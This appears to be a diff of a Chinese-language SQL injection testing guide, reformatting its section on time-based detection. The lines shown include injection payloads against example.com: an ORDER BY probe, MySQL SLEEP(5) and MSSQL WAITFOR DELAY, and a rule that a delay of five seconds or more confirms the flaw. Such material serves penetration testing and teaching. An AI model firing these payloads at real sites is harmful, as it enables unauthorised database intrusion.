@@ -99,17 +99,15 @@ http://example.com/?id=1' ORDER BY 3#
 >
 > 检查页面元素/内容长度变化
 >
-> ### （2）时间型检测
->
+
+### （2）时间型检测
 
 ```http
 MySQL：http://example.com/?id=1' AND SLEEP(5)--+
 MSSQL：http://example.com/?id=1'; WAITFOR DELAY '0:0:5'--
 ```
 
-判断标准：
-
-> 响应时间显著增加（≥5秒）
+判断标准：响应时间显著增加（≥5秒）
 
 ## 6. 过滤规则测试
 
